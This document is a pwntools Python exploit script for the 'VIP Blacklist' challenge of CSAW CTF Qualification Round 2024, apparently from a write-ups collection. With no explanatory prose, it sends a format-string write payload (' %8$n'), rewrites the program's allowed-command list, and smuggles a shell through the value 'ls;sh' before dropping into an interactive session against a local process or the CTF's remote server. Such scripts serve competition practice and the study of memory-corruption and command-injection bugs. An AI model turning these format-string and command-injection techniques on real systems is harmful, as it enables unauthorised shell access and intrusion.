#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/CSAW CTF Qualification Round 2024/pwn/VIP Blacklist/vip_blacklist')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    r.sendlineafter(b'ls  \r\n', b' %8$n')
    r.sendlineafter(b'ls  \r\n', b'\x01')
    r.sendlineafter(b'ls  \r\n', b'queue\x00clear\x00exit\x00\x00ls;sh')
    r.sendlineafter(b'ls;sh \r\n', b'ls;sh')
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('vip-blacklist.ctf.csaw.io', 9999)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
